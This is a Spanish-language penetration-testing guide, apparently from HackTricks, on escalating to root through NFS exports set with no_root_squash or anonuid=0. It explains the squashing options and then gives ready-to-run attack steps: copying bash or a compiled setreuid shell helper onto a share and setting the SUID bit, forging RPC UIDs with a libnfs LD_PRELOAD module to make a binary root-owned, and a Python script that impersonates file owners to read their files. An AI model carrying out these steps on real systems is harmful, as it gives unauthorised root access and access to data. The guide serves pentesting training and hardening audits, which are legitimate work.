# Escalada de privilegios por configuración incorrecta de NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Información básica sobre squashing

Con NFS AUTH_SYS/AUTH_UNIX, el servidor basa las comprobaciones de permisos de archivos en el `uid` y el `gid` proporcionados en cada solicitud RPC. Otros tipos de seguridad, como Kerberos, usan credenciales diferentes, y el servidor puede asignar las credenciales numéricas antes de comprobar los permisos.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Asigna cada UID y GID a la cuenta anónima, que en Linux suele ser `nobody` (65534). `no_all_squash` es el valor predeterminado para las solicitudes que no son de root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Es el valor predeterminado en Linux y asigna las solicitudes con UID/GID 0 (root) a la cuenta anónima; los demás UID y GID no se someten a squashing.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Desactiva el squashing de root, por lo que las solicitudes con UID/GID 0 pueden procesarse como root en el servidor.<sup>[[4]](#references)</sup>

Si un cliente autorizado puede montar un export con permisos de escritura en **`/etc/exports`** configurado con **`no_root_squash`**, sus solicitudes con UID/GID 0 pueden escribir en él como el usuario root del servidor.<sup>[[4]](#references)</sup>

`root_squash` solo reasigna el UID/GID 0; con AUTH_SYS, el **UID/GID numérico distinto de cero** de un cliente autorizado aún puede coincidir con otra cuenta del servidor. Por tanto, un export con permisos de escritura puede convertirse en una ruta entre usuarios incluso con el squashing de root activado, si el cliente puede crear un archivo con esa identidad numérica y el servidor permite el acceso. Para una transferencia SUID/SGID, comprueba también el propietario del archivo resultante, los permisos de ejecución, el estado `nosuid` del montaje del servidor, las ACL y SELinux u otras políticas. La ruta exportada, la opción `rw` o la coincidencia del número, por sí solas, no demuestran que el cliente tenga permiso, que el export esté activo ni que ambos hosts compartan la misma asignación de identidades efectiva. Inspecciona `/etc/exports` y los metadatos locales de forma pasiva; no montes un nuevo recurso compartido ni crees un archivo de prueba durante el reconocimiento.<sup>[[4]](#references)[[5]](#references)</sup>

Para obtener más información sobre **NFS**, consulta:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Escalada de privilegios

### Asignación anónima equivalente a root

No compruebes solo si está configurado `no_root_squash`. Con `root_squash,anonuid=0,anongid=0`, la solicitud de un cliente con UID/GID 0 se somete a squashing **y vuelve a ser root**. Con `all_squash,anonuid=0,anongid=0`, incluso las identidades no root del cliente se asignan a root en el servidor. En un export `sec=sys` con permisos de escritura, cualquiera de estas configuraciones puede proporcionar la primitiva para crear archivos propiedad de root que se usa en la transferencia SUID descrita a continuación; siguen aplicándose las restricciones sobre los clientes autorizados y el montaje de la víctima.<sup>[[4]](#references)</sup>

En el servidor, usa `exportfs -v` para inspeccionar el export activo y las opciones del **cliente correspondiente**, incluidas `rw`, `sec=`, el modo de squashing y `anonuid`/`anongid`. Revisa también `/etc/exports.d/*.exports` al examinar la configuración; puede que `/etc/exports` no contenga toda la información.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Explotación remota

Opción 1 usando bash:
- En un cliente autorizado, monta como root un export con permisos de escritura, copia **`/bin/bash`** en él, establece su bit **SUID** y ejecútalo desde un montaje de la víctima que no use `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Para que el archivo subido siga siendo propiedad de root, el servidor debe preservar el UID 0 del cliente con **`no_root_squash`** o asignar la solicitud al UID 0 con **`anonuid=0`**. De lo contrario, solo es posible crear un binario SUID para otra cuenta si el cliente puede crearlo o hacerlo propiedad de esa cuenta usando su UID/GID numérico.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Opción 2 usando código C compilado:
- Monta el directorio desde un cliente permitido, copia en él un payload compilado que abuse de los permisos SUID, establece su bit **SUID** y ejecútalo desde la víctima (consulta algunos [payloads SUID en C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Las mismas restricciones que antes

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Exploit local

> [!TIP]
> Ten en cuenta que, si puedes crear un **túnel desde tu máquina hasta la máquina víctima, aún puedes usar la versión Remote para explotar esta escalada de privilegios mediante un túnel para los puertos necesarios**.\
> El siguiente truco es útil cuando `/etc/exports` restringe la exportación a la IP de la víctima: el cliente remoto no puede montarla, pero la técnica local puede operar a través del recurso compartido ya montado en el host autorizado.<sup>[[2]](#references)</sup>\
> Para este método de libnfs sin privilegios, la exportación en **`/etc/exports`** debe usar la opción `insecure` para que el proceso pueda usar un puerto de origen no reservado; `secure` es la opción predeterminada, aunque un proceso capaz de enlazarse a un puerto reservado no necesita esta opción.<sup>[[1]](#references)[[4]](#references)</sup>

### Información básica

Un cliente NFSv3 AUTH_UNIX incluye su UID efectivo, GID y grupos en cada llamada, y el servidor los usa para comprobar permisos. Esta técnica local aprovecha ese modelo falsificando las credenciales RPC mediante [libnfs](https://github.com/sahlberg/libnfs); su módulo preload permite sobrescribir el UID/GID en el contexto NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compilación de la biblioteca

Puede que el ejemplo de libnfs requiera ajustes para el kernel objetivo; el tutorial utilizado aquí indica específicamente que se comenten las llamadas al sistema fallocate antes de compilar el módulo preload.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Llevar a cabo el exploit

El ejemplo crea un pequeño helper en C que inicia una shell, luego lo coloca en el recurso compartido y usa `ld_nfs.so` con UID 0 en el contexto de NFS para convertirlo en SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compila el código del exploit:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Coloca el exploit en el recurso compartido y modifica sus permisos falsificando el UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Ejecuta el exploit para obtener privilegios de root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell para acceder a archivos de forma discreta

Una vez obtenido el acceso root, este patrón de `nfsh.py` establece el UID efectivo en el UID del archivo objetivo antes de ejecutar un comando, lo que permite acceder a él sin cambiar la propiedad de forma recursiva.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Ejecutar como:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [La historia de un privesc de NFS menos conocido](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — página del manual de Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Especificación del protocolo NFS versión 3](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — página del manual de Linux](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
